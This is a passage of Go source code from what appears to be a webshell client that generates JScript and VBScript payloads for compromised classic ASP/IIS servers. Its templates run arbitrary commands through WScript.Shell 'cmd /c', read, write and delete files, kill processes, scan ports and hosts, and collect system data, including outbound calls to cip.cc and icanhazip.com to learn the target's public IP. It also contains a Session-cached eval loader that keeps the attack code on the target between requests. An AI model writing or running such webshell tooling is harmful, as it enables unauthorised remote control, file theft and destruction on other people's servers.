package shell

import (
	"context"
	"encoding/base64"
	"fmt"
	"sort"
	"strings"
)

// aspShell 是 ASP 类靶机的公共实现，asp（JScript）与 asp-vbs（VBScript）共用。
//
// 两者提交给靶机的脚本引擎不同（JScript vs VBScript），所以同一套能力有两套模板，
// 且字符串转义函数也不同（jsStr vs vbsStr）。这里用 vbs 字段区分，模板与转义统一在
// 方法内按 vbs 选择，避免每个能力函数里再写 `if o.Type == TypeAspVbs` 的二次分支。
type aspShell struct {
	vbs bool
}

func newAspJS() Shell  { return aspShell{vbs: false} }
func newAspVBS() Shell { return aspShell{vbs: true} }

func (a aspShell) Type() string {
	if a.vbs {
		return TypeAspVbs
	}
	return TypeAsp
}

// wshAspBootstrapJS / wshAspBootstrapVBS 是 ASP 会话模块机制的「机件」函数定义：
// 定义 wsh_store（把模块源码存入 Session）/ wsh_mod（从 Session 取出源码 eval/ExecuteGlobal
// 执行，再按点名分发到 wsh_<ns>_<method>）/ wsh_clear（清空缓存）。
// 参数传递分方言：JScript 经全局 wsh_args 对象（\x1e/\x1f 打包串拆解）；VBScript 只收
// Scripting.Dictionary 对象（由 Go 侧 modCall 在页面级构造后经 wadict 传入，非字典回
// ARG_NOT_DICT），用 Execute（调用方作用域）直递模块 Sub 的形参 wa——
// ExecuteGlobal 在全局作用域执行、看不见 wsh_mod 的局部变量，故分发调用必须用 Execute。
// ASP 的 Session 默认常驻进程内存（InProc），因此无需落盘文件即可跨请求缓存模块源码；
// 客户端通过 cookie 罐维持 ASPSESSIONID，使同一靶机的会话（含模块缓存）跨请求保持。
// 这些函数定义本身不再随每个请求重发：首次接触靶机时经 bootInstall 存入 Session("wsh_boot")，
// 之后每次请求只由极短的 wshAspRehydrate（见下）从会话里 eval/ExecuteGlobal 出来（本地读取，
// 不占带宽）——把「函数定义」也塞进「公共模块」缓存的思路，与 PHP 同构。
const wshAspBootstrapJS = `
function WshB64Dec(b){ var xml=new ActiveXObject("MSXML2.DOMDocument"); var node=xml.createElement("b64"); node.dataType="bin.base64"; node.text=b; var stm=new ActiveXObject("ADODB.Stream"); stm.Type=1; stm.Open(); stm.Write(node.nodeTypedValue); stm.Position=0; stm.Type=2; stm.Charset="utf-8"; var s=stm.ReadText(); stm.Close(); return s; }
function wsh_store(n,b){ Session("wsh_src_"+n) = WshB64Dec(b); Response.Write(JSON.stringify({ok:true})); }
function wsh_mod(n,arg){ wsh_args={}; if(arg){ var ps=arg.split("\x1e"); for(var i=0;i<ps.length;i++){ var kv=ps[i].split("\x1f"); if(kv.length>=2) wsh_args[kv[0]]=kv[1]; } } var ns=n,m=""; var dot=n.indexOf("."); if(dot>=0){ ns=n.substring(0,dot); m=n.substring(dot+1); } var s=Session("wsh_src_"+ns); if(!s){ Response.Write(JSON.stringify({ok:false,error:"MODULE_MISSING:"+ns})); return; } try{ Response.CodePage = 65001; Response.CharSet = "utf-8"; eval(s); }catch(e){ Response.Write(JSON.stringify({ok:false,error:"MODULE_SYNTAX:"+ns+":"+e.message})); return; } if(m){ var fn=eval("wsh_"+ns+"_"+m); if(typeof fn==="function"){ try{ fn(wsh_args); }catch(e){ Response.Write(JSON.stringify({ok:false,error:"METHOD_RUNTIME:"+n+":"+e.message})); } } else { Response.Write(JSON.stringify({ok:false,error:"METHOD_MISSING:"+n})); } } }
function wsh_clear(){ var e=new Enumerator(Session.Contents); for(;!e.atEnd();e.moveNext()){ var k=e.item(); if(typeof k==="string"&&k.substr(0,9)==="wsh_src_"){ Session.Contents.Remove(k); } } Response.Write(JSON.stringify({ok:true})); }
`
const wshAspBootstrapVBS = `
Function WshB64Dec(b)
  On Error Resume Next
  Dim xml, node, stm
  Set xml = CreateObject("MSXML2.DOMDocument")
  Set node = xml.createElement("b64")
  node.dataType = "bin.base64"
  node.text = b
  Set stm = CreateObject("ADODB.Stream")
  stm.Type = 1
  stm.Open
  stm.Write node.nodeTypedValue
  stm.Position = 0
  stm.Type = 2
  stm.Charset = "utf-8"
  WshB64Dec = stm.ReadText
  stm.Close
End Function
Sub wsh_store(n, b)
  Session("wsh_src_" & n) = WshB64Dec(b)
  Response.Write("{""ok"":true}")
End Sub
Sub wsh_clear()
  Dim e, k
  Set e = Session.Contents
  For Each k In e
    If Left(k, 9) = "wsh_src_" Then Session.Contents.Remove(k)
  Next
  Response.Write("{""ok"":true}")
End Sub
Sub wsh_mod(n, arg)
  Dim s, ns, m, dot, wa
  If IsObject(arg) Then
    Set wa = arg
  Else
    Response.Write("{""ok"":false,""error"":""ARG_NOT_DICT""}")
    Exit Sub
  End If
  ns = n: m = ""
  dot = InStr(n, ".")
  If dot > 0 Then ns = Left(n, dot - 1): m = Mid(n, dot + 1)
  s = Session("wsh_src_" & ns)
  If IsEmpty(s) Or IsNull(s) Or s = "" Then
    Response.Write("{""ok"":false,""error"":" & Chr(34) & "MODULE_MISSING:" & ns & Chr(34) & "}")
    Exit Sub
  End If
  On Error Resume Next
  Err.Clear
  Response.CodePage = 65001
  Response.CharSet = "utf-8"
  ExecuteGlobal s
  If Err.Number <> 0 Then Response.Write("{""ok"":false,""error"":" & Chr(34) & "MODULE_SYNTAX:" & ns & ":" & Err.Description & Chr(34) & "}"): Response.End
  On Error GoTo 0
  If m <> "" Then
    ' NOTE: look the method up in the source text instead of checking Err after the
    ' call: modules swallow their own errors internally, which leaves Err set and
    ' would false-positive METHOD_MISSING. Reporting MODULE_MISSING here makes the
    ' Go side re-store the module source and retry (self-heals stale sources too).
    If InStr(s, "Sub wsh_" & ns & "_" & m & "(wa)") = 0 And InStr(s, "Function wsh_" & ns & "_" & m & "(wa)") = 0 Then
      Response.Write("{""ok"":false,""error"":" & Chr(34) & "MODULE_MISSING:" & ns & Chr(34) & "}")
    Else
      On Error Resume Next
      Execute "Call wsh_" & ns & "_" & m & "(wa)"
      Err.Clear
      On Error GoTo 0
    End If
  End If
End Sub
Function wsh_dict(arr)
  Dim d, i
  Set d = CreateObject("Scripting.Dictionary")
  For i = 0 To UBound(arr) - 1 Step 2
    d.Add arr(i), arr(i + 1)
  Next
  Set wsh_dict = d
End Function
Function wsh_err(tag)
  ' Format the current global Err into a protocol error JSON:
  ' {"ok":false,"error":"<tag>:<Err.Number>:<Err.Description>"}.
  ' Same idea as wsh_dict: the formatting boilerplate is cached once in the boot,
  ' so each request only sends one short wsh_err("TAG") call.
  ' Escaping reuses vbsJPre/vbsJSuf (backslash, quote, CRLF -> JSON \n).
  ' NOTE: keep this comment ASCII-only. The boot source is embedded verbatim via
  ' vbsStr and never passes through cleanVbs, so non-ASCII bytes here break the lexer.
  Dim s
  s = tag & ":" & Err.Number & ":" & Err.Description
  wsh_err = "{""ok"":false,""error"":" & ` + vbsJPre + `s` + vbsJSuf + ` & "}"
End Function
`

// wshAspRehydrateJS / wshAspRehydrateVBS 是 ASP 每次请求随载荷发送的「重水合」前缀：
// 若靶机会话里已有 wsh_boot（机件函数源码），则本地 eval/ExecuteGlobal 出来（不占带宽）；
// 否则写出 BOOT_MISSING 并 Response.End，由 Go 侧经 bootInstall 补装引导模块后重试。
// 与 PHP 同构：把「函数定义」也塞进「公共模块」缓存，稳态不再每个请求重发机件。
// 注意：wsh_boot 不以 wsh_src_ 开头，故 wsh_clear 本就不会清掉它（重水合根基保留）。
// 判据只看 wsh_boot 是否存在，不校验版本：旧会话缓存的机件若为旧格式（如 wsh_mod 只认
// \x1e/\x1f 打包串的老版），不会自愈重装——故改动机件调用约定后需要换会话/清 Session。
// 同理，若老机件里没有 wsh_err，错误路径会退化成空回显（成功路径不受影响）。
const wshAspRehydrateJS = `if(Session("wsh_boot")){try{eval(Session("wsh_boot"));}catch(e){Response.Write(JSON.stringify({ok:false,error:"BOOT_SYNTAX:"+e.message}));Response.End();}}else{Response.Write(JSON.stringify({ok:false,error:"BOOT_MISSING"}));Response.End();}`
// BOOT_SYNTAX 这一条刻意内联、不调用 wsh_err：它正是「机件本身坏了」的路径，此时 wsh_err
// 尚未定义，调它只会得到空回显。错误报告器不能依赖它要报告的那个东西。
// 只有机件成功装载之后才会用到的 DICT_INIT_FAILED / CALL_FAILED 才走缓存里的 wsh_err。
const wshAspRehydrateVBS = `If IsEmpty(Session("wsh_boot")) Then Response.Write "{""ok"":false,""error"":""BOOT_MISSING""}": Response.End
On Error Resume Next
Err.Clear
ExecuteGlobal Session("wsh_boot")
If Err.Number<>0 Then Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `("BOOT_SYNTAX:" & Err.Description)` + vbsJSuf + ` & "}"):Response.End`

// Run 执行系统命令：用 WScript.Shell.Exec 跑 cmd /c，把 stdout+stderr 夹在标记之间回显。
func (a aspShell) Run(ctx context.Context, o ExecOptions, cmd string) Result {
	cmd = strings.TrimSpace(cmd)
	start, end := marker(), marker()
	var payload string
	if a.vbs {
		payload = fmt.Sprintf(cleanVbs(vbsCmdTmpl), vbsStr(start), vbsStr(end), vbsStr(cmd))
	} else {
		payload = fmt.Sprintf(aspCmdTmpl, jsStr(start), jsStr(end), jsStr(cmd))
	}
	return send(ctx, o, payload, start, end)
}

// wrap 把一段 ASP（JScript/VBScript）代码包上标记包裹（切 UTF-8 + Response.Write 标记），
// 返回 (payload, start, end)。helpers 由调用方自行拼进 code（见 Code 与会话模块）。
func (a aspShell) wrap(code string) (string, string, string) {
	start, end := marker(), marker()
	var wrapper string
	if a.vbs {
		// 先切到 UTF-8 输出（CodePage=65001），否则中文 Windows 的 cmd 输出（GBK）回显到前端会乱码。
		wrapper = "Response.CodePage = 65001\nResponse.CharSet = \"utf-8\"\nResponse.Write " + vbsStr(start) + "\n" + code + "\nResponse.Write " + vbsStr(end)
	} else {
		wrapper = "Response.CodePage = 65001; Response.CharSet = \"utf-8\"; Response.Write(" + jsStr(start) + ");\n" + code + "\nResponse.Write(" + jsStr(end) + ");"
	}
	return wrapper, start, end
}

// Code 提交一段 JScript/VBScript 代码到 ASP 靶机，用于文件管理等结构化能力。
// 外层用 Response.Write 包住 start/end 标记；asp-vbs 必须用 VBScript 语法包裹，
// 否则整页编译失败 -> IIS 500（这就是此前所有 asp-vbs 能力页 500 的根因）。
func (a aspShell) Code(ctx context.Context, o ExecOptions, code string) Result {
	payload, start, end := a.wrap(code)
	return send(ctx, o, payload, start, end)
}

// bootstrap 返回每次请求随载荷发送的「重水合」前缀（极短）：若靶机会话里已有
// wsh_boot，则本地 eval/ExecuteGlobal 出机件函数（不占带宽）；否则写出 BOOT_MISSING。
// 完整的机件函数定义经 bootInstall 一次性写入靶机会话，不再每个请求重发。
func (a aspShell) bootstrap() string {
	if a.vbs {
		return wshAspRehydrateVBS
	}
	return wshAspRehydrateJS
}

// modCall 返回调用某 ASP 模块的短指令（模块源码已缓存在靶机会话中）。
// 注意：jsStr / vbsStr 已自带引号，不要再额外包引号。
// vbs 分支的第二个参数是 encodeArgsVbsDict 产出的 wsh_dict 调用源码（页面级变量 wadict）：
// 建字典的样板（CreateObject + 逐条 .Add）已收入缓存机件 wsh_dict，这里只发一次轻量调用；
// 字典再传给 wsh_mod，由 wsh_mod 用 Execute（调用方作用域）直递模块 Sub 形参 wa，
// 不再经 \x1e/\x1f 打包串与 Session("wsh_arg_*") 信箱。
// 注意变量名必须以字母开头：VBScript 标识符不允许下划线开头（__wa 会直接编译错误 500）。
// 错误策略：整段调用始终留在 On Error Resume Next 之下（故刻意不在调用前 On Error GoTo 0），
// 调 wsh_mod 之后统一收口。这样 wsh_mod 自身未开 handler 的窗口（读 Session、InStr 预检那两段）
// 出错时，由页面接管并写成 JSON 返回，而不是逃逸成 HTTP 500。
// 此处不再重复 On Error Resume Next：重水合前缀已经打开且不会关掉（无 On Error GoTo 0），
// modCall 永远紧跟其后，依赖它是安全的；只保留 Err.Clear 复位状态。
// 事后检查 Err 之所以安全：wsh_mod 在 Execute 之后主动 Err.Clear，模块内部吞掉的错误不会残留，
// 所以此处 Err<>0 只可能是调用本身失败；且 wsh_mod 所有写 JSON 的路径都是 Exit Sub 或
// Response.End，不会出现「先写模块 JSON 再写错误 JSON」的双 JSON。
// 错误 JSON 由缓存机件里的 wsh_err(tag) 格式化（转义样板只发一次），每请求只发一次短调用。
func (a aspShell) modCall(name, argexpr string) string {
	if a.vbs {
		return "Err.Clear\n" + argexpr +
			"\nIf Err.Number<>0 Then Response.Write(wsh_err(\"DICT_INIT_FAILED\")):Response.End\n" +
			"wsh_mod " + vbsStr(name) + ", wadict" +
			"\nIf Err.Number<>0 Then Response.Write(wsh_err(\"CALL_FAILED\"))"
	}
	return "try{wsh_mod(" + jsStr(name) + "," + jsStr(argexpr) + ");}catch(e){Response.Write(JSON.stringify({ok:false,error:\"CALL_FAILED:\"+e.message}));}"
}

// encodeArgs：vbs 方言产出 wsh_dict(...) 调用（字典对象直递模块 Sub 形参）；
// JScript 方言仍走 \x1e/\x1f 打包串（模块函数读全局 wsh_args）。
func (a aspShell) encodeArgs(args map[string]any) string {
	if a.vbs {
		return encodeArgsVbsDict(args)
	}
	return encodeArgsPacked(args)
}

// encodeArgsVbsDict 把参数字典编码为 wsh_dict(Array("k","v",...)) 调用源码：
// 真正的 Scripting.Dictionary 构造（CreateObject + 逐条 .Add）在缓存机件 wsh_dict 里完成，
// 故每请求只发这段轻量调用（载荷用 VBScript 内置 Array 传键值对），再由 On Error 守卫捕获
// scrrun 不可用（等价于旧 DICT_INIT_FAILED）。wsh_mod 收到的仍是字典对象，不回退到打包串。
// 键值均经 vbsStr 转义（"" doubling）；空字典产出 wsh_dict(Array())（构造空 Dictionary）。
func encodeArgsVbsDict(args map[string]any) string {
	var b strings.Builder
	b.WriteString("Set wadict = wsh_dict(Array(")
	keys := make([]string, 0, len(args))
	for k := range args {
		keys = append(keys, k)
	}
	sort.Strings(keys) // 稳定顺序，便于调试（非必须）
	for i, k := range keys {
		if i > 0 {
			b.WriteString(", ")
		}
		b.WriteString(vbsStr(k) + ", " + vbsStr(toStr(args[k])))
	}
	b.WriteString("))")
	return b.String()
}

// modStore 返回把模块源码存入靶机会话的指令：靶机侧 wsh_store 会 base64 解码，故此处先编码。
func (a aspShell) modStore(name, src string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(src))
	if a.vbs {
		return "wsh_store " + vbsStr(name) + ", " + vbsStr(b64)
	}
	return "wsh_store(" + jsStr(name) + "," + jsStr(b64) + ");"
}

// clearCall 返回清空靶机会话中全部模块缓存的指令。
func (a aspShell) clearCall() string {
	if a.vbs {
		return "wsh_clear()"
	}
	return "wsh_clear();"
}

// bootInstall 返回把机件函数（wsh_store/wsh_mod/wsh_clear）一次性写入靶机会话的指令：
// 把机件源码存入 Session("wsh_boot") 并 eval/ExecuteGlobal 出来。自带完整语句，故发送时
// 不需要再前缀 wshAspRehydrate（用空串作 base 即可）。复用了 jsStr/vbsStr 做源码嵌入，
// 与模块存储（modStore）用的是同一套转义，源码文本经嵌入后原样还原、eval 行为不变。
func (a aspShell) bootInstall() string {
	if a.vbs {
		return "Session(\"wsh_boot\") = " + vbsStr(wshAspBootstrapVBS) +
			"\nExecuteGlobal Session(\"wsh_boot\")\nResponse.Write " + `"{""ok"":true}"`
	}
	return "Session(\"wsh_boot\") = " + jsStr(wshAspBootstrapJS) +
		"; eval(Session(\"wsh_boot\")); Response.Write(JSON.stringify({ok:true}));"
}

// Probe 返回 Inspect 探测串：asp（JScript）用 // 注释；asp-vbs（VBScript）用 Rem 注释。
func (a aspShell) Probe() string {
	if a.vbs {
		return "Rem"
	}
	return "//"
}

// ---------- 结构化能力：按 vbs 选择模板与转义，返回靶机代码 ----------

func (a aspShell) PortScan(host string, ports string) (string, error) {
	if a.vbs {
		return cleanVbs(strings.ReplaceAll(strings.ReplaceAll(vbsPortScan,
			"__HOST__", vbsStr(host)), "__PORTS__", vbsStr(ports))), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(aspPortScan,
		"__HOST__", jsStr(host)), "__PORTS__", jsStr(ports)), nil
}

func (a aspShell) HostScan(hosts string, ports string, probe string) (string, error) {
	if a.vbs {
		return cleanVbs(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(vbsHostScan,
			"__HOSTS__", vbsStr(hosts)), "__PORTS__", vbsStr(ports)), "__PROBE__", vbsStr(probe))), nil
	}
	return strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(aspHostScan,
		"__HOSTS__", jsStr(hosts)), "__PORTS__", jsStr(ports)), "__PROBE__", jsStr(probe)), nil
}

// ---------- ASP 靶机模板（靶机侧实际执行的 JScript / VBScript 代码） ----------

// aspCmdTmpl 是 ASP 命令执行的 JScript 骨架：%[1]s=start 标记，%[2]s=end 标记，%[3]s=命令（JS 字符串字面量）。
// 通过 WScript.Shell.Exec 跑 cmd /c，合并标准输出与标准错误，便于教学排错。
const aspCmdTmpl = `try {
  Response.CodePage = 65001;
  Response.CharSet = "utf-8";
  var ws = new ActiveXObject("WScript.Shell");
  var ec = ws.Exec("cmd /c " + %[3]s + " 2>&1");
  var out = "";
  while (!ec.StdOut.AtEndOfStream) { out += ec.StdOut.ReadLine() + "\n"; }
  while (!ec.StdErr.AtEndOfStream) { out += ec.StdErr.ReadLine() + "\n"; }
  Response.Write(%[1]s + out + %[2]s);
} catch (e) { Response.Write(%[1]s + "ERR:" + (e ? e.message : "") + %[2]s); }`

// vbsCmdTmpl 是 ASP 命令执行的 VBScript 骨架：%[1]s=start 标记，%[2]s=end 标记，%[3]s=命令（VBScript 字符串字面量）。
const vbsCmdTmpl =`On Error Resume Next
Response.CodePage = 65001
Response.CharSet = "utf-8"
Dim ws, ec, out
Set ws = CreateObject("WScript.Shell")
Set ec = ws.Exec("cmd /c " & %[3]s & " 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream
  out = out & ec.StdOut.ReadLine() & vbCrLf
Loop
Do While Not ec.StdErr.AtEndOfStream
  out = out & ec.StdErr.ReadLine() & vbCrLf
Loop
If Err.Number <> 0 Then
  Response.Write(%[1]s & "ERR:" & Err.Description & %[2]s)
Else
  Response.Write(%[1]s & out & %[2]s)
End If`

// vbsJPre / vbsJSuf 是内联的 VBScript JSON 字符串转义表达式前后缀。
// 注意：VBScript 的 Execute 不允许在被执行的代码里定义 Function/Sub，
// 且经典 ASP 的 VBScript 引擎不支持 IIf 函数（调用即 500），也常缺 IsNull，
// 所以这里改为在每处直接用 Replace(...Chr...) 内联转义，绝不定义过程、绝不用 IIf。
// 调用处写法为：vbsJPre + <表达式> + vbsJSuf。
// 其中 vbsJPre 先补上 JSON 字符串值的「开口双引号」再打开转义函数，
// vbsJSuf 关闭转义函数并补上 JSON 字符串值的「闭合双引号」。
// 模板里只写 `"key":`（冒号后不写引号），开口/闭合引号都由这里统一补，
// 避免每处模板都手写引号、也避免 VBScript 把模板末尾的 `"` 误当作字符串字面量闭合符。
// 注意 VBScript 表示一个字面量 `"` 需要四个引号 `""""`（三引号 `"""` 会被当成未闭合字符串而编译失败）。
// 换行必须转成 JSON 的 \n（反斜杠+n 两个字符），不能换成裸 Chr(10)：Go 的 encoding/json 会以
// "invalid character '\n' in string literal" 拒绝含裸换行的字符串，导致整条回显解析失败
// （proc.kill 的 Trim(out) 多行 taskkill 输出、以及 CALL_FAILED 的错误描述都会踩到）。
// 反斜杠已在前面先翻倍，故此处新引入的反斜杠不会被二次转义，语义正确。
// 由于 WMI 文本字段可能为 NULL，调用方需保证传入的表达式是非 NULL 字符串
// （例如先 `s = "": s = CStr(field)`，On Error Resume Next 会把 NULL 的 CStr 错误吞掉，s 保持 ""）。
const vbsJPre =`"""" & Replace(Replace(Replace(CStr(`
const vbsJSuf =`), Chr(92), Chr(92) & Chr(92)), Chr(34), Chr(92) & Chr(34)), vbCrLf, Chr(92) & "n") & """"`

// cleanVbs 去掉 VBScript 模板中的非 ASCII 字符（主要是中文注释）。
// 背景：weshell 生成的 .vbs 以 UTF-8 无 BOM 形式提交给 IIS/ASP，而 VBScript 默认按
// 系统 ANSI 代码页（中文 Windows 多为 GBK）解析源码；中文字节会破坏多行字符串字面量
// 与语句结构，导致 "缺少 'End If'" 之类的编译错误（HTTP 500）。
// 只剥离模板自带的非 ASCII（注释）；用户经占位符注入的参数（如中文路径）在 ReplaceAll
// 之后才进入脚本，不受影响。
func cleanVbs(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		if r < 128 {
			b.WriteRune(r)
		}
	}
	return b.String()
}

var vbsFsList =`On Error Resume Next
Dim fs, f, it, arr
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFolder(__DIR__)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  arr = ""
  For Each it In f.Files
    arr = arr & ",{""name"":" & ` + vbsJPre + `it.Name` + vbsJSuf + ` & ",""path"":" & ` + vbsJPre + `it.Path` + vbsJSuf + ` & ",""isDir"":false,""size"":" & CStr(it.Size) & ",""mode"":""""}"
  Next
  For Each it In f.SubFolders
    arr = arr & ",{""name"":" & ` + vbsJPre + `it.Name` + vbsJSuf + ` & ",""path"":" & ` + vbsJPre + `it.Path` + vbsJSuf + ` & ",""isDir"":true,""size"":0,""mode"":""""}"
  Next
  If Len(arr) > 0 Then arr = Mid(arr, 2)
  Response.Write("{""ok"":true,""dir"":" & ` + vbsJPre + `f.Path` + vbsJSuf + ` & ",""entries"":[" & arr & "]}")
End If`

var vbsFsRead =`On Error Resume Next
Dim fs, f, name, size, stream, xml, node, bin
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFile(__PATH__)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  name = f.Name: size = f.Size
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1: stream.Open: stream.LoadFromFile __PATH__: bin = stream.Read: stream.Close
  If Err.Number <> 0 Then
    Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
  Else
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = bin
    If Err.Number <> 0 Then
      Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
    Else
      Dim b64: b64 = node.text
      ' NOTE: MSXML bin.base64 wraps lines; strip them or the JSON string is invalid.
      ' Keep this comment ASCII-only: non-ASCII bytes in the payload confuse the ASP VBScript lexer.
      b64 = Replace(Replace(Replace(b64, vbCrLf, ""), vbCr, ""), vbLf, "")
      Response.Write("{""ok"":true,""name"":" & ` + vbsJPre + `name` + vbsJSuf + ` & ",""size"":" & CStr(size) & ",""base64"":" & ` + vbsJPre + `b64` + vbsJSuf + ` & "}")
    End If
  End If
End If`

var vbsFsWrite =`On Error Resume Next
Dim xml, node, bin, stream
Set xml = CreateObject("MSXML2.DOMDocument")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.text = __B64__
bin = node.nodeTypedValue
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1: stream.Open: stream.Write bin: stream.SaveToFile __PATH__, 2: stream.Close
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  Response.Write("{""ok"":true,""bytes"":" & CStr(LenB(bin)) & "}")
End If`

var vbsFsDelete =`On Error Resume Next
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists(__PATH__) Then
  fs.DeleteFile __PATH__
ElseIf fs.FolderExists(__PATH__) Then
  fs.DeleteFolder __PATH__
End If
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  Response.Write("{""ok"":true}")
End If`

var vbsProcKill =`On Error Resume Next
Dim force, ws, ec, out, ok, args
force = (__SIG__ = 9)
Set ws = CreateObject("WScript.Shell")
args = " /PID " & __PID__
If force Then args = args & " /F"
Set ec = ws.Exec("cmd /c taskkill" & args & " 2>&1")
out = ""
Do While Not ec.StdOut.AtEndOfStream: out = out & ec.StdOut.ReadLine() & vbCrLf: Loop
Do While Not ec.StdErr.AtEndOfStream: out = out & ec.StdErr.ReadLine() & vbCrLf: Loop
ok = (InStr(1, out, "SUCCESS", 1) > 0)
If Err.Number <> 0 Then
  Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Err.Description` + vbsJSuf + ` & "}")
Else
  If ok Then
    Response.Write("{""ok"":true,""error"":" & ` + vbsJPre + `Trim(out)` + vbsJSuf + ` & "}")
  Else
    Response.Write("{""ok"":false,""error"":" & ` + vbsJPre + `Trim(out)` + vbsJSuf + ` & "}")
  End If
End If`

var vbsMonitor =`On Error Resume Next
Dim wmi, host, oscap, upsec, cs, e, os, mt, mf, cores, model, cpus, c, pu, dq, d, total, free, disks, json, fs, mnt, uptime, use
host = "": oscap = "": upsec = Null
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set cs = wmi.ExecQuery("SELECT Name FROM Win32_ComputerSystem")
For Each e In cs: host = CStr(e.Name): Next
Set os = wmi.ExecQuery("SELECT Caption,TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime FROM Win32_OperatingSystem")
mt = 0: mf = 0
For Each e In os
  oscap = CStr(e.Caption)
  mt = CDbl(e.TotalVisibleMemorySize) * 1024
  mf = CDbl(e.FreePhysicalMemory) * 1024
  upsec = DateDiff("s", DateSerial(CInt(Mid(e.LastBootUpTime,1,4)), CInt(Mid(e.LastBootUpTime,5,2)), CInt(Mid(e.LastBootUpTime,7,2))) + TimeSerial(CInt(Mid(e.LastBootUpTime,9,2)), CInt(Mid(e.LastBootUpTime,11,2)), CInt(Mid(e.LastBootUpTime,13,2))), Now())
Next
cores = 0: model = ""
Set cpus = wmi.ExecQuery("SELECT Name,NumberOfLogicalProcessors,NumberOfCores FROM Win32_Processor")
For Each c In cpus
  cores = cores + CInt(c.NumberOfLogicalProcessors)
  If cores = 0 Then cores = cores + CInt(c.NumberOfCores)
  If model = "" Then model = c.Name
Next
If cores = 0 Then cores = 1
pu = 0
Set q = wmi.ExecQuery("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'")
For Each e In q: pu = e.PercentProcessorTime: Next
uptime = "": If Not IsNull(upsec) Then uptime = CStr(upsec)
disks = ""
Set dq = wmi.ExecQuery("SELECT DeviceID,Size,FreeSpace,FileSystem FROM Win32_LogicalDisk WHERE DriveType=3")
For Each d In dq
  total = CDbl(d.Size): free = CDbl(d.FreeSpace)
  fs = "": fs = CStr(d.FileSystem)
  mnt = "": mnt = CStr(d.DeviceID & "\")
  use = 0
  If total > 0 Then use = CInt((total - free) / total * 100)
  disks = disks & ",{""fs"":" & ` + vbsJPre + `fs` + vbsJSuf + ` & ",""total"":" & CStr(total) & ",""used"":" & CStr(total - free) & ",""avail"":" & CStr(free) & ",""use"":" & CStr(use) & ",""mount"":" & ` + vbsJPre + `mnt` + vbsJSuf + ` & "}"
Next
If Len(disks) > 0 Then disks = Mid(disks, 2)
' 网络地址：内网 IP（非回环 / 非链路本地）与公网 IP（出网探测）
intIPs = ""
Set ncQ = wmi.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
For Each nc In ncQ
  If Not IsNull(nc.IPAddress) Then
    For Each a In nc.IPAddress
      If Not IsNull(a) Then
        If InStr(a, ":") = 0 And Left(a, 3) <> "127" And Left(a, 7) <> "169.254" Then
          If intIPs = "" Then intIPs = a Else intIPs = intIPs & "," & a
        End If
      End If
    Next
  End If
Next
intIPjson = ""
If intIPs <> "" Then
  aArr = Split(intIPs, ",")
  For ai = 0 To UBound(aArr)
    intIPjson = intIPjson & "," & """" & aArr(ai) & """"
  Next
  If Len(intIPjson) > 0 Then intIPjson = Mid(intIPjson, 2)
End If
pubIP = ""
On Error Resume Next
Set xh = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number = 0 Then
  ' 启用 TLS 1.2：老系统 WinHttpRequest 默认只到 TLS 1.0，连不上现代 HTTPS 站点
  xh.Option(9) = 2720
  Err.Clear
  xh.SetTimeouts 5000, 5000, 5000, 5000
  ' 优先 cip.cc（多行文本，含 "IP : x.x.x.x"），失败回退 icanhazip.com / ipconfig.io（纯 IP）
  xh.Open "GET", "https://cip.cc", False
  xh.Send
  If Err.Number = 0 Then
    pubTxt = xh.ResponseText
    pubTxt = Replace(pubTxt, vbCrLf, vbLf)
    pubTxt = Replace(pubTxt, vbCr, vbLf)
    pubLines = Split(pubTxt, vbLf)
    For Each pl In pubLines
      If UCase(Left(pl, 2)) = "IP" Then
        cpos = InStr(pl, ":")
        If cpos > 0 Then
          pubIP = Trim(Mid(pl, cpos + 1))
          If pubIP <> "" Then Exit For
        End If
      End If
    Next
    ' 含空白 / HTML / 超长视为无效解析，交给其余 URL 兜底
    If pubIP <> "" Then
      If InStr(pubIP, " ") > 0 Or InStr(pubIP, "<") > 0 Or Len(pubIP) > 45 Then pubIP = ""
    End If
  End If
  If pubIP = "" Then
    Err.Clear
    Set xh2 = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
      xh2.Option(9) = 2720
      Err.Clear
      xh2.SetTimeouts 5000, 5000, 5000, 5000
      xh2.Open "GET", "https://icanhazip.com", False
      xh2.Send
      If Err.Number = 0 Then pubIP = Trim(xh2.ResponseText)
    End If
  End If
  If pubIP = "" Then
    Err.Clear
    Set xh3 = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
      xh3.Option(9) = 2720
      Err.Clear
      xh3.SetTimeouts 5000, 5000, 5000, 5000
